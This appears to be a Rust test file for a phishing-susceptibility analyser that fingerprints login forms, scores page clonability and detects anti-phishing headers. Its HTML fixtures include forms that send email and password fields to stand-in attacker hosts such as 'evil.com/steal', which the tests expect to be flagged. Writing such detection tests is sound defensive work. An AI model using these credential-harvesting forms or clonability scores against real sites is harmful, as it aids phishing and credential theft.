use super::*;

const LOGIN_HTML: &str = r#"
<html>
<head><title>Acme Corp Login</title></head>
<body>
<form method="POST" action="/api/login">
  <input type="text" name="username" id="username" placeholder="Email" autocomplete="username">
  <input type="password" name="password" id="password" placeholder="Password">
  <input type="submit" value="Sign In">
</form>
</body>
</html>
"#;

const MULTI_FORM_HTML: &str = r#"
<html>
<body>
<form method="POST" action="/search">
  <input type="text" name="q">
  <input type="submit">
</form>
<form method="POST" action="https://evil.com/steal">
  <input type="email" name="email" placeholder="Enter email">
  <input type="password" name="pass">
</form>
<form action="javascript:void(0)">
  <input type="password" name="pin">
</form>
</body>
</html>
"#;

#[test]
fn fingerprint_detects_login_form() {
    let results = fingerprint_login_page("https://example.com/login", LOGIN_HTML);
    assert_eq!(results.len(), 1);
    let fp = &results[0];
    assert_eq!(fp.url, "https://example.com/login");
    assert_eq!(fp.form_action, "/api/login");
    assert_eq!(fp.method, "POST");
    assert!(fp.has_password_field);
    assert!(fp.has_username_field);
    assert_eq!(fp.page_title, Some("Acme Corp Login".to_string()));
    assert!(fp.input_fields.len() >= 3);
}

#[test]
fn fingerprint_skips_non_login_forms() {
    let results = fingerprint_login_page("https://example.com", MULTI_FORM_HTML);
    assert_eq!(results.len(), 2);
    assert!(results.iter().all(|fp| fp.has_password_field));
}

#[test]
fn fingerprint_extracts_form_fields() {
    let results = fingerprint_login_page("https://example.com/login", LOGIN_HTML);
    let fp = &results[0];
    let password_field = fp
        .input_fields
        .iter()
        .find(|f| f.name == "password")
        .unwrap();
    assert_eq!(password_field.field_type, "password");
    assert_eq!(password_field.id, Some("password".to_string()));
    assert_eq!(password_field.placeholder, Some("Password".to_string()));
}

#[test]
fn fingerprint_empty_html() {
    let results = fingerprint_login_page("https://example.com", "<html></html>");
    assert!(results.is_empty());
}

#[test]
fn clonability_no_protections_scores_high() {
    let headers: Vec<(&str, &str)> = vec![];
    let score = assess_clonability(LOGIN_HTML, &headers);
    assert!(score.overall > 0.5);
    assert!(!score.factors.is_empty());
}

#[test]
fn clonability_with_csp_scores_lower() {
    let headers = vec![
        (
            "Content-Security-Policy",
            "default-src 'self'; frame-ancestors 'none'",
        ),
        ("X-Frame-Options", "DENY"),
    ];
    let score_protected = assess_clonability(LOGIN_HTML, &headers);

    let score_unprotected = assess_clonability(LOGIN_HTML, &[]);
    assert!(score_protected.overall < score_unprotected.overall);
}

#[test]
fn clonability_factors_present() {
    let score = assess_clonability(LOGIN_HTML, &[]);
    let factor_names: Vec<&str> = score.factors.iter().map(|f| f.name.as_str()).collect();
    assert!(factor_names.contains(&"csp_presence"));
    assert!(factor_names.contains(&"frame_protection"));
    assert!(factor_names.contains(&"external_resources"));
    assert!(factor_names.contains(&"inline_content"));
    assert!(factor_names.contains(&"html_complexity"));
    assert!(factor_names.contains(&"total_resources"));
}

#[test]
fn form_action_same_origin() {
    let forms = fingerprint_login_page("https://example.com/login", LOGIN_HTML);
    let actions = analyze_form_actions("https://example.com/login", &forms);
    assert_eq!(actions.len(), 1);
    assert_eq!(actions[0].action_type, FormActionType::RelativePath);
    assert!(!actions[0].suspicious);
    assert!(!actions[0].cross_origin);
}

#[test]
fn form_action_cross_origin_flagged() {
    let forms = fingerprint_login_page("https://example.com", MULTI_FORM_HTML);
    let actions = analyze_form_actions("https://example.com", &forms);
    let cross_origin = actions
        .iter()
        .find(|a| a.action_url == "https://evil.com/steal")
        .unwrap();
    assert_eq!(cross_origin.action_type, FormActionType::CrossOrigin);
    assert!(cross_origin.cross_origin);
    assert!(cross_origin.suspicious);
    assert!(cross_origin.reason.is_some());
}

#[test]
fn form_action_javascript_uri_flagged() {
    let forms = fingerprint_login_page("https://example.com", MULTI_FORM_HTML);
    let actions = analyze_form_actions("https://example.com", &forms);
    let js_action = actions
        .iter()
        .find(|a| a.action_url == "javascript:void(0)")
        .unwrap();
    assert_eq!(js_action.action_type, FormActionType::JavascriptUri);
    assert!(js_action.suspicious);
}

#[test]
fn form_action_type_classification() {
    assert_eq!(
        classify_form_action("https://a.com", ""),
        FormActionType::Empty
    );
    assert_eq!(
        classify_form_action("https://a.com", "javascript:alert(1)"),
        FormActionType::JavascriptUri
    );
    assert_eq!(
        classify_form_action("https://a.com", "data:text/html,foo"),
        FormActionType::DataUri
    );
    assert_eq!(
        classify_form_action("https://a.com", "mailto:x@x.com"),
        FormActionType::Mailto
    );
    assert_eq!(
        classify_form_action("https://a.com", "/submit"),
        FormActionType::RelativePath
    );
    assert_eq!(
        classify_form_action("https://a.com", "https://a.com/x"),
        FormActionType::SameOrigin
    );
    assert_eq!(
        classify_form_action("https://a.com", "https://b.com/x"),
        FormActionType::CrossOrigin
    );
}

#[test]
fn anti_phishing_detects_xfo() {
    let headers = vec![("X-Frame-Options", "DENY")];
    let result = assess_anti_phishing_controls(&headers, "<html></html>");
    assert!(
        result
            .controls_present
            .contains(&AntiPhishingControl::XFrameOptions)
    );
    assert!(
        !result
            .controls_missing
            .contains(&AntiPhishingControl::XFrameOptions)
    );
}

#[test]
fn anti_phishing_detects_csp() {
    let headers = vec![(
        "Content-Security-Policy",
        "default-src 'self'; frame-ancestors 'none'",
    )];
    let result = assess_anti_phishing_controls(&headers, "<html></html>");
    assert!(
        result
            .controls_present
            .contains(&AntiPhishingControl::ContentSecurityPolicy)
    );
    assert!(
        result
            .controls_present
            .contains(&AntiPhishingControl::CspStrict)
    );
}

#[test]
fn anti_phishing_detects_sri() {
    let html = r#"<script src="x.js" integrity="sha384-abc123"></script>"#;
    let result = assess_anti_phishing_controls(&[], html);
    assert!(
        result
            .controls_present
            .contains(&AntiPhishingControl::SubresourceIntegrity)
    );
}

#[test]
fn anti_phishing_detects_mfa_references() {
    let html = r#"<html><div>Enable two-factor authentication for your account</div></html>"#;
    let result = assess_anti_phishing_controls(&[], html);
    assert!(result.controls_present.contains(&AntiPhishingControl::Mfa));
}

#[test]
fn anti_phishing_detects_fido2() {
    let html = r#"<html><script>navigator.credentials.create({publicKey: ...})</script></html>"#;
    let result = assess_anti_phishing_controls(&[], html);
    assert!(
        result
            .controls_present
            .contains(&AntiPhishingControl::Fido2)
    );
}

#[test]
fn anti_phishing_no_controls() {
    let result = assess_anti_phishing_controls(&[], "<html></html>");
    assert!(result.controls_present.is_empty());
    assert!(!result.controls_missing.is_empty());
    assert_eq!(result.resilience_score, 0.0);
}

#[test]
fn anti_phishing_resilience_score_range() {
    let headers = vec![
        ("X-Frame-Options", "DENY"),
        (
            "Content-Security-Policy",
            "default-src 'self'; frame-ancestors 'none'",
        ),
        ("Referrer-Policy", "no-referrer"),
    ];
    let html = r#"<script src="x.js" integrity="sha384-abc"></script>"#;
    let result = assess_anti_phishing_controls(&headers, html);
    assert!(result.resilience_score > 0.0);
    assert!(result.resilience_score <= 1.0);
}

#[test]
fn brand_assets_finds_logos() {
    let html = r#"
        <html>
        <img src="/images/logo.png" alt="Company Logo" class="site-logo">
        <img src="photo.jpg" alt="Team">
        </html>
    "#;
    let result = analyze_brand_assets(html, "https://example.com");
    assert_eq!(result.logos_found.len(), 1);
    assert!(result.logos_found[0].contains("logo.png"));
}

#[test]
fn brand_assets_finds_css() {
    let html = r#"
        <link rel="stylesheet" href="/css/main.css">
        <link rel="stylesheet" href="https://cdn.example.com/theme.css">
        <link rel="icon" href="/favicon.ico">
    "#;
    let result = analyze_brand_assets(html, "https://example.com");
    assert_eq!(result.css_urls.len(), 2);
    assert!(result.favicon_url.is_some());
}

#[test]
fn brand_assets_finds_brand_terms() {
    let html =
        r#"<html><body>Please sign in to your account. Enter your password below.</body></html>"#;
    let result = analyze_brand_assets(html, "https://example.com");
    assert!(result.brand_terms.contains(&"sign in".to_string()));
    assert!(result.brand_terms.contains(&"password".to_string()));
    assert!(result.brand_terms.contains(&"account".to_string()));
}

#[test]
fn brand_assets_exposure_score_range() {
    let html = r#"
        <html>
        <link rel="icon" href="/favicon.ico">
        <link rel="stylesheet" href="/style.css">
        <img src="/logo.png" class="logo">
        <body>Please log in with your credentials</body>
        </html>
    "#;
    let result = analyze_brand_assets(html, "https://example.com");
    assert!(result.exposure_score > 0.0);
    assert!(result.exposure_score <= 1.0);
}

#[test]
fn full_analysis_report_structure() {
    let headers = vec![("X-Frame-Options", "SAMEORIGIN")];
    let report = analyze_phishing_susceptibility("https://example.com/login", LOGIN_HTML, &headers);
    assert_eq!(report.url, "https://example.com/login");
    assert_eq!(report.login_pages.len(), 1);
    assert!(!report.clonability.factors.is_empty());
    assert_eq!(report.form_actions.len(), 1);
    assert!(!report.anti_phishing.controls_present.is_empty());
}

#[test]
fn full_analysis_no_login_pages() {
    let html = "<html><body>No forms here</body></html>";
    let report = analyze_phishing_susceptibility("https://example.com", html, &[]);
    assert!(report.login_pages.is_empty());
    assert!(report.form_actions.is_empty());
}

#[test]
fn full_analysis_high_risk_page() {
    let html = r#"
        <html>
        <head><title>Login</title></head>
        <body>
        <img src="/logo.png" class="brand-logo">
        <link rel="stylesheet" href="/brand.css">
        <link rel="icon" href="/favicon.ico">
        <p>Sign in to your account with your password and credentials</p>
        <form method="POST" action="https://evil.com/phish">
            <input type="email" name="email" placeholder="Email" autocomplete="username">
            <input type="password" name="pass">
        </form>
        </body>
        </html>
    "#;
    let report = analyze_phishing_susceptibility("https://example.com/login", html, &[]);
    assert!(!report.login_pages.is_empty());
    assert!(report.form_actions.iter().any(|a| a.suspicious));
    assert!(report.brand_exposure.exposure_score > 0.0);
}

#[test]
fn phishing_risk_display() {
    assert_eq!(format!("{}", PhishingRisk::Critical), "Critical");
    assert_eq!(format!("{}", PhishingRisk::High), "High");
    assert_eq!(format!("{}", PhishingRisk::Medium), "Medium");
    assert_eq!(format!("{}", PhishingRisk::Low), "Low");
    assert_eq!(format!("{}", PhishingRisk::Minimal), "Minimal");
}

#[test]
fn form_action_type_display() {
    assert_eq!(format!("{}", FormActionType::SameOrigin), "Same Origin");
    assert_eq!(format!("{}", FormActionType::CrossOrigin), "Cross Origin");
    assert_eq!(
        format!("{}", FormActionType::JavascriptUri),
        "javascript: URI"
    );
    assert_eq!(format!("{}", FormActionType::Empty), "Empty");
}

#[test]
fn anti_phishing_control_display() {
    assert_eq!(format!("{}", AntiPhishingControl::Mfa), "MFA");
    assert_eq!(format!("{}", AntiPhishingControl::Fido2), "FIDO2/WebAuthn");
    assert_eq!(
        format!("{}", AntiPhishingControl::SubresourceIntegrity),
        "Subresource Integrity"
    );
}

#[test]
fn resolve_url_handles_protocols() {
    assert_eq!(
        resolve_url("https://a.com", "https://b.com/x"),
        "https://b.com/x"
    );
    assert_eq!(
        resolve_url("https://a.com", "//cdn.a.com/x.js"),
        "https://cdn.a.com/x.js"
    );
    assert_eq!(
        resolve_url("https://a.com/page", "/img/logo.png"),
        "https://a.com/img/logo.png"
    );
    assert_eq!(
        resolve_url("https://a.com/dir", "file.css"),
        "https://a.com/dir/file.css"
    );
}

#[test]
fn clonability_score_clamped() {
    let score = assess_clonability("<html></html>", &[]);
    assert!(score.overall >= 0.0);
    assert!(score.overall <= 1.0);
    for factor in &score.factors {
        assert!(factor.score >= 0.0);
        assert!(factor.score <= 1.0);
    }
}

#[test]
fn brand_exposure_empty_html() {
    let result = analyze_brand_assets("<html></html>", "https://example.com");
    assert!(result.logos_found.is_empty());
    assert!(result.css_urls.is_empty());
    assert!(result.favicon_url.is_none());
    assert!(result.brand_terms.is_empty());
    assert_eq!(result.exposure_score, 0.0);
}

#[test]
fn form_action_empty_action() {
    let html = r#"
        <form action="">
            <input type="password" name="pw">
        </form>
    "#;
    let forms = fingerprint_login_page("https://example.com", html);
    let actions = analyze_form_actions("https://example.com", &forms);
    assert_eq!(actions[0].action_type, FormActionType::Empty);
    assert!(!actions[0].suspicious);
}

#[test]
fn certificate_pinning_detection() {
    let headers = vec![("Public-Key-Pins", "pin-sha256=\"abc\"; max-age=5184000")];
    let result = assess_anti_phishing_controls(&headers, "<html></html>");
    assert!(
        result
            .controls_present
            .contains(&AntiPhishingControl::CertificatePinning)
    );
}

#[test]
fn referrer_policy_detection() {
    let headers = vec![("Referrer-Policy", "no-referrer")];
    let result = assess_anti_phishing_controls(&headers, "<html></html>");
    assert!(
        result
            .controls_present
            .contains(&AntiPhishingControl::ReferrerPolicy)
    );
}
